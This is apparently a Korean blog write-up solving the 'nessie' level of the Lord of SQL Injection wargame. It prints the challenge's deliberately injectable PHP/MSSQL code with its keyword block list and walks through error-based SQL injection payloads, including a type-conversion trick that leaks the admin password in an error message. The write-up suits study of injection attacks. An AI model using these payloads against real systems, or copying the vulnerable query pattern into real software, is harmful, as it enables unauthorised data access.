---
title: "[Lord of SQL Injection] LoS - nessie 문제풀이"
date: 2019-07-05
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제의 이름은 `nessie`이다.
이제 `SQLite`가 끝나고 `MSSQL`에서의 `SQL Injection` 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from prob_nessie where id='' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect();
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select id from prob_nessie where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  sqlsrv_query($db,$query);
  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));

  $query = "select pw from prob_nessie where id='admin'"; 
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("nessie"); 
  highlight_file(__FILE__);
?>
```

문제를 풀기 위해서는 `id`가 `admin`인 행의 `pw`를 구해야 한다.
`MSSQL`은 처음이라 인터넷에 검색을 해 보니, `MSSQL`에서 쿼리 오류 시 출력 해 주는 오류 구문을 가지고 `Error Based SQL Injection`을 하는 것 같다.
그래서 가장 기본적으로 사용하는 `having`을 사용하기 위해 아래와 같이 입력했다.  

```plain
?id=a' having 1=1 --
```

그럼 완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_nessie where id='a' having 1=1 --' and pw=''
```

`--`를 삽입했기 때문에 `having 1=1` 뒤의 `'and pw='`는 주석처리가 된다.
즉, `select id from prob_nessie where id='a' having 1=1`만 실행이 되는데, 이 때 오류가 발생한다.
`having` 구문은 `group by`절이 필요한데, 이 `group by` 절을 입력하지 않아 쿼리 오류가 발생하는 것이다.
위의 값을 문제에 입력 해 보면 아래와 같은 오류가 발생한다.  

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_nessie.id' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
```

친절하게 테이블 명과 컬럼 명을 알려준다.
이런 방식으로 오류를 유발하여 `id`가 `admin`인 행의 `pw`를 유발하면 될 것 같다.
고민을 하다가 `pw` 부분에서 `Type Confusion` 오류를 유발시켜 보았다.
이를 위해 아래와 같이 입력 해 주었다.

```plain
?id=admin&pw=1' or id='admin' and pw=1 -- 
```

완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_nessie where id='admin' and pw='1' or id='admin' and pw=1 --'
```

앞의 `id='admin' and pw='1'`은 해당사항이 없기 때문에 뒤의 조건으로 넘어 갈 것이고, `id='admin' and pw=1`의 경우, `pw`는 `varchar` 형태이지만 내가 입력 한 값은 `1`, 정수이기 때문에 오류가 발생한다.  

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'uawe0f9ji34fjkl' to data type int.
```

친절하게 `pw`의 값을 출력 해 주었다.
이제 이 값을 입력하면 문제를 풀 수 있다.  

```plain
?id=admin&pw=uawe0f9ji34fjkl
```

---

```php
------------------------------------------------------------------------------------------------
query : select id from prob_nessie where id='admin' and pw='uawe0f9ji34fjkl'
------------------------------------------------------------------------------------------------

NESSIE Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect();
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select id from prob_nessie where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  sqlsrv_query($db,$query);
  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));

  $query = "select pw from prob_nessie where id='admin'"; 
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("nessie"); 
  highlight_file(__FILE__);
?>
```

---

```plain
NESSIE Clear!!
```